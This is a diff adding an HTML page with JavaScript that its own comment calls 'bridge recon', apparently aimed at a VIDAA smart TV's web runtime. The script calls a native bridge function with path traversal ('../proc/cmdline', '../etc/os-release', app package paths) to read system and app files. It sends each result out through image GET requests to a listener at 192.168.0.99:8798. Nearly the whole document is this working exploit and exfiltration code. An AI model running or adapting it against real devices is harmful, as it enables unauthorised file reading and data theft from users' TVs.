@@ -1,0 +1,24 @@
+<!doctype html>
+<!-- u7p3 — read-only bridge recon for 85UR8S. Results rendered big; exfil via img GET to :8798 -->
+<html><head><meta charset="utf-8"><title>u7p3</title></head>
+<body style="background:#000;color:#0f0;font:30px monospace;padding:8px">
+<pre id="out">u7p3…</pre>
+<script>
+(function(){
+"use strict";
+var out=document.getElementById("out");
+function line(t){out.textContent+="\n"+t; exfil(t);}
+function exfil(t){try{var i=new Image();i.src="http://192.168.0.99:8798/l?d="+encodeURIComponent(t.slice(0,140));}catch(e){}}
+function hi(a,p){try{return HiUtils_createRequest(a,p);}catch(e){return {exc:String(e)};}}
+
+line("UA="+navigator.userAgent);
+var j=hi("fileRead",{path:["../APPS/pkgs/"],mode:6}); line("pkgs dir ret="+j.ret+" msg="+String(j.msg||"").slice(0,120));
+var up=hi("fileRead",{path:["../proc/uptime"],mode:6}); line("uptime="+(up.msg||JSON.stringify(up)).slice(0,60));
+var v=hi("fileRead",{path:["../var/local/version.txt"],mode:6}); line("version.txt ret="+v.ret+" "+String(v.msg||"").slice(0,120));
+var osr=hi("fileRead",{path:["../etc/os-release"],mode:6}); line("os-release ret="+osr.ret+" "+String(osr.msg||"").slice(0,150));
+var pl=hi("fileRead",{path:["../proc/cmdline"],mode:6}); line("cmdline ret="+pl.ret+" "+String(pl.msg||"").slice(0,200));
+var cpu=hi("fileRead",{path:["../proc/cpuinfo"],mode:6}); line("cpuinfo ret="+cpu.ret+" "+String(cpu.msg||"").slice(0,200));
+var sl=hi("fileRead",{path:["../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/services/serviceList.json"],mode:6}); line("serviceList ret="+sl.ret+" "+String(sl.msg||"").slice(0,150));
+line("done");
+})();
+</script></body></html>
